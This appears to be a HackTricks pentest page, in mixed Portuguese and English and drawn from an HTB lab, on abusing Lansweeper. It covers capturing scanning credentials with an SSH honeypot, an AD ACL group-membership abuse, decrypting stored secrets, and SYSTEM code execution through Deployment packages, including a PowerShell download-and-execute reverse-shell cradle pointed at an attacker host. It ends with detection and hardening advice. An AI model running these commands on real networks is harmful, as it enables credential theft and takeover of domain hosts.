# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper é uma plataforma de descoberta e inventário de ativos de TI comumente implantada em Windows e integrada ao Active Directory. As credenciais configuradas no Lansweeper são usadas pelos seus scanning engines para autenticar em ativos através de protocolos como SSH, SMB/WMI e WinRM. Configurações incorretas frequentemente permitem:

- Interceptação de credenciais ao redirecionar um Scanning Target para um host controlado pelo atacante (honeypot)
- Abuso de AD ACLs expostas por grupos relacionados ao Lansweeper para obter acesso remoto
- Decriptação on-host de secrets configurados no Lansweeper (connection strings e stored scanning credentials)
- Execução de código em endpoints gerenciados via a feature Deployment (frequentemente executando como SYSTEM)

Esta página resume fluxos de trabalho práticos do atacante e comandos para abusar desses comportamentos durante engagements.

## 1) Harvest scanning credentials via honeypot (SSH example)

Idea: create a Scanning Target that points to your host and map existing Scanning Credentials to it. When the scan runs, Lansweeper will attempt to authenticate with those credentials, and your honeypot will capture them.

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Validar credenciais capturadas contra serviços do DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notas
- Funciona de forma semelhante para outros protocolos quando você consegue coagir o scanner ao seu listener (SMB/WinRM honeypots, etc.). SSH costuma ser o mais simples.
- Muitos scanners se identificam com banners de cliente distintos (e.g., RebexSSH) e tentarão comandos benignos (uname, whoami, etc.).

## 2) AD ACL abuse: obtenha acesso remoto adicionando-se a um grupo app-admin

Use BloodHound para enumerar os direitos efetivos da conta comprometida. Uma descoberta comum é um grupo específico do scanner ou do app (e.g., “Lansweeper Discovery”) detendo GenericAll sobre um grupo privilegiado (e.g., “Lansweeper Admins”). Se o grupo privilegiado também for membro de “Remote Management Users”, o WinRM fica disponível assim que nos adicionarmos.

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll em grupo com BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Em seguida, obtenha um shell interativo:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Dica: as operações do Kerberos são sensíveis ao tempo. Se você receber KRB_AP_ERR_SKEW, sincronize com o DC primeiro:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Descriptografar segredos configurados pelo Lansweeper no host

No servidor Lansweeper, o site ASP.NET normalmente armazena uma string de conexão criptografada e uma chave simétrica usada pela aplicação. Com acesso local adequado, você pode descriptografar a string de conexão do banco de dados e então extrair as credenciais de varredura armazenadas.

Locais típicos:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Use SharpLansweeperDecrypt para automatizar a descriptografia e extração das credenciais armazenadas:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
A saída esperada inclui detalhes de conexão DB e credenciais de varredura em texto simples, como contas Windows e Linux usadas em todo o ambiente. Estas frequentemente têm privilégios locais elevados em hosts de domínio:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Utilize as creds de scanning do Windows recuperadas para acesso privilegiado:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Como membro de “Lansweeper Admins”, a interface web expõe Deployment e Configuration. Em Deployment → Deployment packages, você pode criar pacotes que executam comandos arbitrários em assets direcionados. A execução é realizada pelo serviço Lansweeper com altos privilégios, resultando em execução de código como NT AUTHORITY\SYSTEM no host selecionado.

Passos de alto nível:
- Crie um novo pacote Deployment que execute um one-liner em PowerShell ou cmd (reverse shell, add-user, etc.).
- Aponte para o asset desejado (por exemplo, o DC/host onde o Lansweeper roda) e clique em Deploy/Run now.
- Obtenha sua shell como SYSTEM.

Exemplos de payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Ações de deployment são ruidosas e deixam logs no Lansweeper e nos event logs do Windows. Use com parcimônia.

## Detecção e hardening

- Restrinja ou remova enumerações SMB anônimas. Monitore por RID cycling e acesso anômalo a shares do Lansweeper.
- Controles de egress: bloqueie ou restrinja fortemente SSH/SMB/WinRM de saída a partir dos hosts scanner. Alerta para portas não padrão (ex.: 2022) e banners de cliente incomuns como Rebex.
- Proteja `Website\\web.config` e `Key\\Encryption.txt`. Externalize segredos em um vault e rotacione em caso de exposição. Considere contas de serviço com privilégios mínimos e gMSA quando viável.
- Monitoramento AD: alerte sobre mudanças em grupos relacionados ao Lansweeper (ex.: “Lansweeper Admins”, “Remote Management Users”) e sobre alterações de ACL que concedam GenericAll/Write membership em grupos privilegiados.
- Audite criações/alterações/execuções de pacotes de Deployment; alerte em pacotes que invoquem cmd.exe/powershell.exe ou conexões de saída inesperadas.

## Tópicos relacionados
- Enumeração SMB/LSA/SAMR e RID cycling
- Password spraying em Kerberos e considerações sobre clock skew
- Análise de caminhos com BloodHound de grupos application-admin
- Uso de WinRM e movimento lateral

## Referências
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
